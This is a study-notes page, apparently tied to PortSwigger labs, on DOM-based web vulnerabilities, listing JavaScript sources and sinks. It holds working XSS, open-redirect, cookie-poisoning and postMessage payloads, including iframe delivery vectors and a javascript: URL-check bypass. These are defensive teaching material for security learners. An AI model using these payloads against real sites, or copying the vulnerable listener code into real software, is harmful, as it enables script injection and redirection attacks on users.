---
layout: default
title: "DOM Based"
parent: "Web Application"
nav_order: 9
---

# DOM-Based Vulnerabilities

The Document Object Model (DOM) is the browser's hierarchical representation of elements on a page. DOM-based attacks rely on insufficiently validating user input before using it in JavaScript that alters the DOM.

All DOM-based attacks involve:
- **Source** — where untrusted/attacker-controllable data enters a JavaScript function (e.g., URL parameters, fragments)
- **Sink** — where that data is used to update the DOM or trigger a dangerous action

Simple example:
```javascript
goto = location.hash.slice(1)
if (goto.startsWith('https:')) { location = goto; }
```
Source: `location.hash.slice(1)` — Sink: `location` — Exploit: `https://realwebsite.com/#https://attacker.com`

---

## Sources (Attacker-Controllable)

```javascript
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
location.search
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB
```

Also usable as sources:
- Reflected data
- Stored data
- Web messages (postMessage)

Most common source: the URL, typically via `location` or URL fragments (`#`).

---

## Sinks

### JavaScript Execution Sinks
```javascript
eval()
Function()
setTimeout()
setInterval()
setImmediate()
execCommand()
execScript()
msSetImmediate()
range.createContextualFragment()
crypto.generateCRMFRequest()
```

### DOM Modification Sinks
```javascript
document.write()
document.body.innerHTML
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.src
element.srcdoc
element.setAttribute()
element.href
element.action
```

### Navigation Sinks (Open Redirect)
```javascript
window.location
location.href
location.hostname
location.pathname
location.protocol
location.assign()
location.replace()
open()
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.ajax() / $.ajax()
```

### Other Dangerous Sinks
```javascript
document.cookie
WebSocket()
postMessage()
setRequestHeader()
FileReader.readAsText()
ExecuteSql()
sessionStorage.setItem()
document.evaluate()
JSON.parse()
RegExp()
```

### jQuery Sinks
```javascript
add(), after(), append(), animate(), insertAfter(), insertBefore(), before(),
html(), prepend(), replaceAll(), replaceWith(), wrap(), wrapInner(), wrapAll(),
has(), constructor(), init(), index(), jQuery.parseHTML(), $.parseHTML()
```

---

## DOM-Based XSS

Most potent form. Inject JavaScript via source → sink chain.

**URL fragment example (jQuery hashchange):**
```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```
Self-XSS: `https://realwebsite.com#<img src=1 onerror=alert(1)></img>`

Deliver to victim via iframe:
```html
<iframe src="https://realwebsite.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

---

## DOM-Based Open Redirection

When attacker-controllable data flows into a navigation sink.

**Lab example** — Back to Blog button:
```html
<a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : '/'">
```
Exploit: `https://LAB-ID.web-security-academy.net/post?postId=4&url=https://EXPLOIT-SERVER.net/`

---

## DOM-Based Cookie Manipulation

When attacker-controllable data flows into `document.cookie`.

**Lab example** — inject XSS via poisoned cookie:
```html
<iframe src="https://LAB.net/product?productId=1&'><script>print()</script>"
  onload="if(!window.x)this.src='https://LAB.net/';window.x=1;">
```
1. iframe loads product page with malicious payload appended to URL
2. Browser saves the malicious value as `lastViewedProduct` cookie
3. `onload` redirects to home page
4. When home page loads, it reads the cookie and executes the payload

---

## Web Message (postMessage) Vulnerabilities

Arise when a script passes attacker-controllable data from `postMessage()` into an unsafe sink. The `postMessage()` method sends messages between different windows/frames.

**Vulnerable listener:**
```javascript
window.addEventListener('message', function(e) {
    eval(e.data);   // no origin check, dangerous sink
});
```

Exploit:
```html
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```

**`*` as targetOrigin** means the message is sent regardless of the recipient's origin.

### Lab Payloads

**Basic postMessage XSS:**
```html
<iframe src="https://LAB-ID.web-security-academy.net/"
  onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

**postMessage with URL check bypass** (listener checks for `http:` or `https:` in message):
```html
<iframe src="https://LAB-ID.web-security-academy.net/"
  onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

**postMessage with JSON.parse** (listener uses `JSON.parse` and has `load-channel` case that sets `iframe.src`):
```html
<iframe src="https://EXPLOIT-SERVER.net/"
  onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

---

## Other DOM-Based Vulnerability Types

### document.domain Manipulation
Scripts that set `document.domain` to attacker-controllable data can allow cross-origin interaction between pages that set the same value.

### WebSocket-URL Poisoning
The `WebSocket` constructor can be fed attacker-controllable URLs.
Reference: https://portswigger.net/web-security/dom-based/websocket-url-poisoning

### Link Manipulation
Scripts writing attacker-controllable data to `element.href`, `element.src`, or `element.action` can redirect navigation or form submissions.

### Ajax Request-Header Manipulation
Reference: https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation
